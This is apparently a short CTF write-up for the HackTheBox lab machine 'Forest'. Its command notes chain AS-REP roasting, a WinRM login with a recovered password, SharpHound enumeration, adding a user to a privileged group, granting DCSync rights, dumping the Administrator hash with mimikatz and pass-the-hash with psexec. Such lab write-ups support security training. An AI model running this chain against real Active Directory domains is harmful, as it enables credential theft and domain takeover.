---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/LcROWwoyOxU/0.jpg
layout: post
media_subpath: /assets/posts/2020-03-21-forest-hackthebox
tags:
- active directory
- asrep-roasting
- bloodhound
- dcsync
- hackthebox
- windows
title: Forest @ HackTheBox
---

Forest is a 20-point active directory machine on HackTheBox that involves user enumeration, AS-REP-Roasting and abusing Active Directory ACLs to become admin.

{% youtube LcROWwoyOxU %}

## Notes

To route your windows vm through kali run the following commands on kali:

```
sudo sysctl -w net.ipv4.ip_forward=1
sudo /sbin/iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE
sudo /sbin/iptables -A FORWARD -i tun0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo /sbin/iptables -A FORWARD -i eth1 -o tun0 -j ACCEPT
```

  
On Windows set the kali vm as default gateway & the target box as dns server. Make sure both vms share the same virtual network. Windows can now use the same vpn connection and you can join the windows vm to the domain.

AS-REP-Roast:

```
GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161 
```

WinRM:

```
Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*'
$user='svc-alfresco'
$pass=ConvertTo-SecureString -AsPlainText 's3rvice' -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user,$pass
New-PSSession -URI http://forest.htb:5985/wsman -Credential $cred
Enter-PSSession <num>
```

Sharphound:

```
sharphound.exe -c all
```

Add user & put into group (requires powerview):

```
net user xct <pw> /add /domain
add-domaingroupmember -identity "exchange windows permissions" -members "xct"
```

Add DCSync rights (requires powerview):

```
add-domainobjectacl -credential $cred -targetidentity "DC=htb,DC=local" -Rights DCSync
```

DCSync (mimikatz):

```
lsadump::dcsync /domain:htb.local /user:Administrator
```

Pass-The-Hash:

```
psexec.py -hashes :<hash> administrator@10.10.10.161
```